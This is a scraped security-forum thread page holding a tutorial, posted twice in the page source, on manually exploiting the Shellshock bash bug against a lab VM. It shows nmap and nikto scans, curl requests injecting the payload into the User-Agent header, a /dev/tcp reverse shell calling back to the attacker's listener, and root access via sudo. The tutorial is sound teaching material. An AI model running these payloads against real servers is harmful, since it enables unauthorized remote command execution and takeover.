'-' + '-snip-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-</pre>\r\n</div>As both the result of nmap and nikto matches we can go for the exploitation of the shellshock vulnerability.<br />\r\n<br />\r\nLets first find out the poc online, simple google &quot;shellshock poc&quot; will get you the desired result at the top, that will be a github link with so many poc\'s. the poc i chose is the below one:<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">env X=\'() { :; }; echo &quot;CVE-2014-6271 vulnerable&quot;\' bash -c id</pre>\r\n</div>From now on we will only use curl, not the browser, as i said before i will get you the feel for curl too.<br />\r\n<br />\r\nso we will do the curl.<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:216px;">root@kali:~# curl -v 192.168.0.102/cgi-bin/status -s &gt; /dev/null\r\n*   Trying 192.168.0.102...\r\n* Connected to 192.168.0.102 (192.168.0.102) port 80 (#0)\r\n&gt; GET /cgi-bin/status HTTP/1.1\r\n&gt; Host: 192.168.0.102\r\n&gt; User-Agent: curl/7.47.0\r\n&gt; Accept: */*\r\n&gt; \r\n&lt; HTTP/1.1 200 OK\r\n&lt; Date: Fri, 19 Aug 2016 15:32:49 GMT\r\n&lt; Server: Apache/2.2.21 (Unix) DAV/2\r\n&lt; Content-Length: 177\r\n&lt; Content-Type: application/json\r\n&lt; \r\n{ [177 bytes data]\r\n* Connection #0 to host 192.168.0.102 left intact</pre>\r\n</div>Now getting a glimpse of the above request below are the parameter that would be needed to successsfuly exploit the vulnerability:<br />\r\n<br />\r\n1- The method os reques(like GET /cgi-bin/status HTTP/1.1).<br />\r\n2. The hostname(like Host: 192.168.0.102).<br />\r\n3. we can use the useragent too, but its not required<br />\r\n4. what type of request we are expecting(like Accept: */*).<br />\r\n<br />\r\nso now we will try to inject our poc in any of the field above and hope that get executed.<br />\r\n<br />\r\nwe will try to inject in the User-Agent field first,<br />\r\n<br />\r\nOur poc is: <br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">\'() { :; }; echo &quot;CVE-2014-6271 vulnerable&quot;\' bash -c id</pre>\r\n</div>after injecting into User-Agent:<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">\'User-Agent: () { :; }; echo &quot;CVE-2014-6271 vulnerable&quot; bash -c id\'</pre>\r\n</div>Now lets make the request and hope for the good to happen.<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:216px;">root@kali:~# curl -H \'User-Agent: () { :; }; echo &quot;CVE-2014-6271 vulnerable&quot; bash -c id\' http://192.168.0.102/cgi-bin/status\r\n&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;\r\n&lt;html&gt;&lt;head&gt;\r\n&lt;title&gt;500 Internal Server Error&lt;/title&gt;\r\n&lt;/head&gt;&lt;body&gt;\r\n&lt;h1&gt;Internal Server Error&lt;/h1&gt;\r\n&lt;p&gt;The server encountered an internal error or\r\nmisconfiguration and was unable to complete\r\nyour request.&lt;/p&gt;\r\n&lt;p&gt;Please contact the server administrator,\r\n creaper@creep.com and inform them of the time the error occurred,\r\nand anything you might have done that may have\r\ncaused the error.&lt;/p&gt;\r\n&lt;p&gt;More information about this error may be available\r\nin the server error log.&lt;/p&gt;\r\n&lt;/body&gt;&lt;/html&gt;</pre>\r\n</div>now we can see it throughs an error.<br />\r\nCan we give up here, No, becuase i am not, let\'s try another command by tweaking the command.<br />\r\nwe will now give the complete path as we don\'t know about the environment variables set on the target machine. we will use &quot;/bin/bash&quot; in place of &quot;bash&quot; and will try to ping our attacking ip with the port so that we can listen on netcat, and finally get to know whether this command is working or not.   <br />\r\n<br />\r\nlets try the below:<br />\r\n<br />\r\nBefore: <div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">\'User-Agent: () { :; }; echo &quot;CVE-2014-6271 vulnerable&quot; bash -c id\'</pre>\r\n</div>After: <div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">\'User-Agent: () { :; }; /bin/bash -c \'ping -c 3 192.168.0.101:1234\'\'</pre>\r\n</div>now we will listen on port 1234 on netcat.<br />\r\n<br />\r\nnc -lvp 1234<br />\r\n<br />\r\nlet fire this up:<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:48px;">root@kali:~# nc -lvp 1234\r\nlistening on [any] 1234 ...</pre>\r\n</div>Now sending the request to the target server:<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">root@kali:~# curl -H \'User-Agent: () { :; }; /bin/bash -c \'ping -c 3 192.168.0.101:1234\'\' http://192.168.0.102/cgi-bin/status</pre>\r\n</div>Now after sending the request the console stops doesn\'t give any output, but when we have a good look at our netcat we can see the below:<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:108px;">root@kali:~# nc -lvp 1234\r\nlistening on [any] 1234 ...\r\nconnect to [192.168.0.101] from kali [192.168.0.101] 42144\r\nGET / HTTP/1.1\r\nHost: 192.168.0.101:1234\r\nAccept: */*\r\nUser-Agent: () { :; }; /bin/bash -c ping</pre>\r\n</div>Voila, we are getting the command executed.<br />\r\nNow we know our poc finally works.So now our next task is to get a reverse shell, lets try that too.<br />\r\n<br />\r\nlets create a listener on attacking machine on port 1234.<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:48px;">root@kali:~# nc -lvp 1234\r\nlistening on [any] 1234 ...</pre>\r\n</div>we will use the below command to get a reverse shell, reference from pentestmonkey website.<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.101/1234 0&gt;&amp;1</pre>\r\n</div>fire the below command in the User-Agent<br />\r\n<br />\r\nBefore: <div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">\'User-Agent: () { :; }; /bin/bash -c \'ping -c 3 192.168.0.101:1234\'\'</pre>\r\n</div>After: <div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">\'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.101/1234 0&gt;&amp;1\'</pre>\r\n</div>&quot;/bin/bash -i&quot; because we want the command and things to be interactive.<br />\r\n<br />\r\nthis command is very useful when you don\'t have any netcat installed on the target machine or server.Make note of this command :-) .<br />\r\n<br />\r\nFinally time to blast:<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">root@kali:~# curl -H \'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.101/1234 0&gt;&amp;1\' http://192.168.0.102/cgi-bin/status</pre>\r\n</div>Now have a innocent look on the netcat console:<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:132px;">root@kali:~# nc -lvp 1234\r\nlistening on [any] 1234 ...\r\n192.168.0.102: inverse host lookup failed: Unknown host\r\nconnect to [192.168.0.101] from (UNKNOWN) [192.168.0.102] 53743\r\nbash: no job control in this shell\r\nbash-4.2$ id\r\nid\r\nuid=1000(creep) gid=50(staff) groups=50(staff),100(creep)\r\nbash-4.2$</pre>\r\n</div>Awesome we have a got a reverse shell, we can get the root shell via sudo -s as the user is a part of sudoers.<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:72px;">bash-4.2$ sudo -s\r\nsudo -s\r\nid\r\nuid=0(root) gid=0(root) groups=0(root)</pre>\r\n</div>Finally our main objective was to do shellshock manually which we did successfully<br />\r\n<br />\r\nThings are not always easy as shown here we need to try many possibilities like how server behaves, environmental variables and many more. however i hope this aticle will get you to read any exploit available publically and make required modifications as real world senarios are always surprising and if you are not aware of how things work, you can get yourself in trouble.<br />\r\n<br />\r\nHave Fun...\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_14722" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_14722" class="newreply" href="newreply.php?do=newreply&amp;p=14722" rel="nofollow" title="Reply With Quote"><img id="quoteimg_14722" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+
+// next/previous post info
+pn[14722] = "14722,14722";
+pn[0] = ",14722";
+
+// cached usernames
+pu[0] = guestphrase;
+pu[25682] = "mayank7651";
+
+// -->
+</script>
+
+
+<div id="threaded_view">
+	<h4>Threaded View</h4>
+
+	<div id="posttree">
+		<script type="text/javascript">
+		<!--
+			writeLink(14722, 0, 0, 25682, "", "Manually exploiting...", "08-19-2016", "05:32 PM", 0, "showthread96f0.html?t=6902&amp;p=14722#post14722");
+
+		//-->
+		</script>
+	</div>
+</div>
+	
+
+	
+		<ol id="posts" class="posts" start="1">
+			
+<li class="postbitlegacy postbitim postcontainer old" id="post_14722">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">08-19-2016,&nbsp;<span class="time">05:32 PM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post14722" href="showthread8d08.html?t=6902&amp;p=14722&amp;viewfull=1#post14722" class="postcounter">#1</a><a id="postcount14722" name="1"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="member97ce.html?u=25682" title="mayank7651 is offline"><strong>mayank7651</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="member97ce.html?u=25682" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="search6007.html?do=finduser&amp;userid=25682&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="private8cd6.html?do=newpm&amp;u=25682" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blog97ce.html?u=25682" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		
+		
+		<li class="right">
+			<a href="list4bb5.html?r=author/25682-mayank7651" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="mayank7651 is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Garage Newcomer
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_14722_25682" title="mayank7651 is on a distinguished road">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>Jun 2016</dd>
+					
+					
+					<dt>Posts</dt> <dd>10</dd>	
+					
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow">
+				
+				
+				<h2 class="title icon">
+					Manually exploiting shellshock Vulnerability
+				</h2>
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_14722">
+						<blockquote class="postcontent restore ">
+							Manually exploiting the shellshock vulnerability, so that you can get a complete picture about how the exploitation of shellshock works.<br />
+It has been given CVE-2014-6271.<br />
+The vulnerability is in Bourne Again Shell (BASH) which we call as shellshock also known as Bashdoor.Many services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.<br />
+At first we need to find cgi's that runs system commands and somehow display them to us, If you follow along you can get a good look at the curl too, because we are going to use it along the way.<br />
+To find the cgi's , we can run the dirbuster/dirb/nikto and then  after finding all the cgi scripts we can crossverify via the nmap whether the vulnerability actually exists or not, yes the vulnerability is so critical that it has got a nmap nse script for it. <br />
+I have setup a vm for this in my virtual lab to demonstrate this.<br />
+As usual first we scan the target via nmap(we can do the check here itself, but we'll not we will follow along)<br />
+<br />
+Running nmap:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:204px;">root@kali:~# nmap 192.168.0.102 -sV -O -sT 
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-19 14:59 IST
+Nmap scan report for 192.168.0.102
+Host is up (0.00051s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.0 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.21 ((Unix) DAV/2)
+MAC Address: 00:0C:29:19:F6:5E (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.0
+Network Distance: 1 hop</pre>
+</div>now we know what are all the ports open we can run nikto now on port 80 to get a feel what is the scene here.<br />
+ <br />
+Running nikto:-<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:216px;">root@kali:~# nikto -host 192.168.0.102
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.0.102
++ Target Hostname:    192.168.0.102
++ Target Port:        80
++ Start Time:         2016-08-19 15:16:56 (GMT5.5)
+---------------------------------------------------------------------------
+-----------------------------------------------------------------------snip-----------------------------------------------------------------------
++ Uncommon header 'nikto-added-cve-2014-6278' found, with contents: true
++ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
++ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+-----------------------------------------------------------------------snip-----------------------------------------------------------------------
++ End Time:           2016-08-19 15:17:22 (GMT5.5) (26 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+</div>Now you can see in the result  that it shows &quot;/cgi-bin/status&quot; is shellshock vulnerable.<br />
+<br />
+we will cross verify the result with the nmap.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:204px;">root@kali:~# nmap 192.168.0.102 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/status
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-19 15:23 IST
+Nmap scan report for 192.168.0.102
+Host is up (0.00046s latency).
+PORT   STATE SERVICE
+80/tcp open  http
+| http-shellshock: 
+|   VULNERABLE:
+|   HTTP Shellshock vulnerability
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2014-6271
+|       This web application might be affected by the vulnerability known as Shellshock. It seems the server
+|       is executing commands injected via malicious HTTP headers.
+-----------------------------------------------------------------------snip-----------------------------------------------------------------------</pre>
+</div>As both the result of nmap and nikto matches we can go for the exploitation of the shellshock vulnerability.<br />
+<br />
+Lets first find out the poc online, simple google &quot;shellshock poc&quot; will get you the desired result at the top, that will be a github link with so many poc's. the poc i chose is the below one:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:36px;">env X='() { :; }; echo &quot;CVE-2014-6271 vulnerable&quot;' bash -c id</pre>
+</div>From now on we will only use curl, not the browser, as i said before i will get you the feel for curl too.<br />
+<br />
+so we will do the curl.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:216px;">root@kali:~# curl -v 192.168.0.102/cgi-bin/status -s &gt; /dev/null
+*   Trying 192.168.0.102...
+* Connected to 192.168.0.102 (192.168.0.102) port 80 (#0)
+&gt; GET /cgi-bin/status HTTP/1.1
+&gt; Host: 192.168.0.102
+&gt; User-Agent: curl/7.47.0
+&gt; Accept: */*
+&gt; 
+&lt; HTTP/1.1 200 OK
+&lt; Date: Fri, 19 Aug 2016 15:32:49 GMT
+&lt; Server: Apache/2.2.21 (Unix) DAV/2
+&lt; Content-Length: 177
+&lt; Content-Type: application/json
+&lt; 
+{ [177 bytes data]
+* Connection #0 to host 192.168.0.102 left intact</pre>
+</div>Now getting a glimpse of the above request below are the parameter that would be needed to successsfuly exploit the vulnerability:<br />
+<br />
+1- The method os reques(like GET /cgi-bin/status HTTP/1.1).<br />
+2. The hostname(like Host: 192.168.0.102).<br />
+3. we can use the useragent too, but its not required<br />
+4. what type of request we are expecting(like Accept: */*).<br />
+<br />
+so now we will try to inject our poc in any of the field above and hope that get executed.<br />
+<br />
+we will try to inject in the User-Agent field first,<br />
+<br />
+Our poc is: <br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:36px;">'() { :; }; echo &quot;CVE-2014-6271 vulnerable&quot;' bash -c id</pre>
+</div>after injecting into User-Agent:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:36px;">'User-Agent: () { :; }; echo &quot;CVE-2014-6271 vulnerable&quot; bash -c id'</pre>
+</div>Now lets make the request and hope for the good to happen.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:216px;">root@kali:~# curl -H 'User-Agent: () { :; }; echo &quot;CVE-2014-6271 vulnerable&quot; bash -c id' http://192.168.0.102/cgi-bin/status
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;500 Internal Server Error&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Internal Server Error&lt;/h1&gt;
+&lt;p&gt;The server encountered an internal error or
+misconfiguration and was unable to complete
+your request.&lt;/p&gt;
+&lt;p&gt;Please contact the server administrator,
+ creaper@creep.com and inform them of the time the error occurred,
+and anything you might have done that may have
+caused the error.&lt;/p&gt;
+&lt;p&gt;More information about this error may be available
+in the server error log.&lt;/p&gt;
+&lt;/body&gt;&lt;/html&gt;</pre>
+</div>now we can see it throughs an error.<br />
+Can we give up here, No, becuase i am not, let's try another command by tweaking the command.<br />
+we will now give the complete path as we don't know about the environment variables set on the target machine. we will use &quot;/bin/bash&quot; in place of &quot;bash&quot; and will try to ping our attacking ip with the port so that we can listen on netcat, and finally get to know whether this command is working or not.   <br />
+<br />
+lets try the below:<br />
+<br />
+Before: <div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:36px;">'User-Agent: () { :; }; echo &quot;CVE-2014-6271 vulnerable&quot; bash -c id'</pre>
+</div>After: <div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:36px;">'User-Agent: () { :; }; /bin/bash -c 'ping -c 3 192.168.0.101:1234''</pre>
+</div>now we will listen on port 1234 on netcat.<br />
+<br />
+nc -lvp 1234<br />
+<br />
+let fire this up:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:48px;">root@kali:~# nc -lvp 1234
+listening on [any] 1234 ...</pre>
+</div>Now sending the request to the target server:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:36px;">root@kali:~# curl -H 'User-Agent: () { :; }; /bin/bash -c 'ping -c 3 192.168.0.101:1234'' http://192.168.0.102/cgi-bin/status</pre>
+</div>Now after sending the request the console stops doesn't give any output, but when we have a good look at our netcat we can see the below:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:108px;">root@kali:~# nc -lvp 1234
+listening on [any] 1234 ...
+connect to [192.168.0.101] from kali [192.168.0.101] 42144
+GET / HTTP/1.1
+Host: 192.168.0.101:1234
+Accept: */*
+User-Agent: () { :; }; /bin/bash -c ping</pre>
+</div>Voila, we are getting the command executed.<br />
+Now we know our poc finally works.So now our next task is to get a reverse shell, lets try that too.<br />
+<br />
+lets create a listener on attacking machine on port 1234.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:48px;">root@kali:~# nc -lvp 1234
+listening on [any] 1234 ...</pre>
+</div>we will use the below command to get a reverse shell, reference from pentestmonkey website.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:36px;">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.101/1234 0&gt;&amp;1</pre>
+</div>fire the below command in the User-Agent<br />
+<br />
+Before: <div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:36px;">'User-Agent: () { :; }; /bin/bash -c 'ping -c 3 192.168.0.101:1234''</pre>
+</div>After: <div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:36px;">'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.101/1234 0&gt;&amp;1'</pre>
+</div>&quot;/bin/bash -i&quot; because we want the command and things to be interactive.<br />
+<br />
+this command is very useful when you don't have any netcat installed on the target machine or server.Make note of this command :-) .<br />
+<br />
+Finally time to blast:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:36px;">root@kali:~# curl -H 'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.101/1234 0&gt;&amp;1' http://192.168.0.102/cgi-bin/status</pre>
+</div>Now have a innocent look on the netcat console:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:132px;">root@kali:~# nc -lvp 1234
+listening on [any] 1234 ...
+192.168.0.102: inverse host lookup failed: Unknown host
+connect to [192.168.0.101] from (UNKNOWN) [192.168.0.102] 53743
+bash: no job control in this shell
+bash-4.2$ id
+id
+uid=1000(creep) gid=50(staff) groups=50(staff),100(creep)
+bash-4.2$</pre>
+</div>Awesome we have a got a reverse shell, we can get the root shell via sudo -s as the user is a part of sudoers.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:72px;">bash-4.2$ sudo -s
+sudo -s
+id
+uid=0(root) gid=0(root) groups=0(root)</pre>
+</div>Finally our main objective was to do shellshock manually which we did successfully<br />
+<br />
+Things are not always easy as shown here we need to try many possibilities like how server behaves, environmental variables and many more. however i hope this aticle will get you to read any exploit available publically and make required modifications as real world senarios are always surprising and if you are not aware of how things work, you can get yourself in trouble.<br />
+<br />
+Have Fun...
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_14722" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_14722" class="newreply" href="newreply844a.html?do=newreply&amp;p=14722" rel="nofollow" title="Reply With Quote"><img id="quoteimg_14722" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+		</ol>
+                <div class="separator"></div>
+		<div class="postlistfoot">
+			
+		</div>
+
+	
+
+</div>
+
+<div id="below_postlist" class="noinlinemod below_postlist">
+	
+	<div id="pagination_bottom" class="pagination_bottom">
+	
+		<div class="clear"></div>
+<div class="navpopupmenu popupmenu nohovermenu" id="showthread_navpopup">
+	
+		<span class="shade">Quick Navigation</span>
+		<a href="showthread2237.html?t=6902" class="popupctrl"><span class="ctrlcontainer">Network Vulnerabiltity Assessment &amp; Penetration Testing</span></a>
+		<a href="showthread23a9.html?t=6915&amp;goto=nextoldest#top" class="textcontrol" onclick="document.location.hash='top';return false;">Top</a>
+	
+	<ul class="navpopupbody popupbody popuphover">
+		
+		<li class="optionlabel">Site Areas</li>
+		<li><a href="usercp.html">Settings</a></li>
+		<li><a href="private.html">Private Messages</a></li>
+		<li><a href="subscription.html">Subscriptions</a></li>
+		<li><a href="online.html">Who's Online</a></li>
+		<li><a href="search.html">Search Forums</a></li>
+		<li><a href="forum.html">Forums Home</a></li>
+		
+			<li class="optionlabel">Forums</li>
+			
+		
+			
+				<li><a href="forumdisplay58da.html?f=1">Garage Network</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay12a3.html?f=2">Garage Announcements</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplaye57d.html?f=58">Bravo - Null 2012</a></li>
+			
+		
+			
+				<li><a href="forumdisplay0756.html?f=59">Garage Local Chapter Meets</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay31e6.html?f=4">Garage Rules</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye774.html?f=5">Feedback &amp; Suggestions</a></li>
+			
+		
+			
+				<li><a href="forumdisplayd42b.html?f=7">Introduce Your Self</a></li>
+			
+		
+			
+				<li><a href="forumdisplay2b89.html?f=38">Shout-box</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplaycf19.html?f=6">Garage Lounge</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay5579.html?f=30">Hacking for Beginners</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay6ac3.html?f=57">Did You Know?</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay957d.html?f=8">Security &amp; Hacking News Thread</a></li>
+			
+		
+			
+				<li><a href="forumdisplay3215.html?f=36">Career in InfoSec</a></li>
+			
+		
+			
+				<li><a href="forumdisplay814c.html?f=29">Request Zone</a></li>
+			
+		
+			
+				<li><a href="forumdisplay13b6.html?f=27">Noobs Corner</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayfdc5.html?f=9">Hacking and Security Discussions</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplayfac0.html?f=55">Tip | Trick of the Day</a></li>
+			
+		
+			
+				<li><a href="forumdisplayc4a6.html?f=66">ICS / SCADA Security</a></li>
+			
+		
+			
+				<li><a href="forumdisplay6111.html?f=67">Internet of Things - IoT</a></li>
+			
+		
+			
+				<li><a href="forumdisplay15ca.html?f=10">Network Vulnerabiltity Assessment &amp; Penetration Testing</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplaya05c.html?f=56">Post Exploitation</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay8a83.html?f=11">Web Application Penetration Testing</a></li>
+			
+		
+			
+				<li><a href="forumdisplay01c9.html?f=12">Wireless and Bluetooth Hacking</a></li>
+			
+		
+			
+				<li><a href="forumdisplay48ab.html?f=17">Computer Forensics and Incident Handling</a></li>
+			
+		
+			
+				<li><a href="forumdisplay218b.html?f=19">Physical Security and Social Engineering</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb09f.html?f=15">General Security &amp; Best Practices</a></li>
+			
+		
+			
+				<li><a href="forumdisplay907f.html?f=42">Security and Hacking Videos</a></li>
+			
+		
+			
+				<li><a href="forumdisplay9e0d.html?f=54">Mobile Security</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
